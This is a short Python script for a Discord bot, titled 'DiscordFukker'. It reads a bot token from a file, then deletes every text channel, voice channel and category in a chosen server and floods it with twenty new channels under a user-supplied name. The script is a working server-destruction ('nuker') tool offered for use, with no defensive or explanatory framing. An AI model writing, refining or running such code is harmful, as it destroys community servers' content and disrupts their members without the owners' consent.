import discord
import msvcrt
import ctypes

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

custom_title = "DiscordFukker - Mr Dan"
set_console_title(custom_title)

class MyClient(discord.Client):
    async def on_ready(self):
        print('Logged in as', self.user)

        guild_id = int(input("Enter the guild ID: "))

        guild = self.get_guild(guild_id)

        if guild is None:
            print("Guild not found. Please check the guild ID.")
            return

        for channel in guild.text_channels:
            await channel.delete()

        for channel in guild.voice_channels:
            await channel.delete()

        for category in guild.categories:
            await category.delete()

        category_name = input("Enter the custom channel name: ")

        new_category = await guild.create_category(category_name)

        for i in range(1, 11):
            new_channel_name = f'{category_name}-{i}'
            await guild.create_text_channel(new_channel_name, category=new_category)

        for i in range(1, 11):
            new_channel_name = f'{category_name}-{i}'
            await guild.create_voice_channel(new_channel_name, category=new_category)

if __name__ == "__main__":
    with open('tokens.txt', 'r') as file:
        bot_token = file.read().strip()
    
    client = MyClient()
    client.run(bot_token)

print("Press Enter to exit...")
while True:
    if msvcrt.kbhit() and msvcrt.getch() == b'\r':
        break
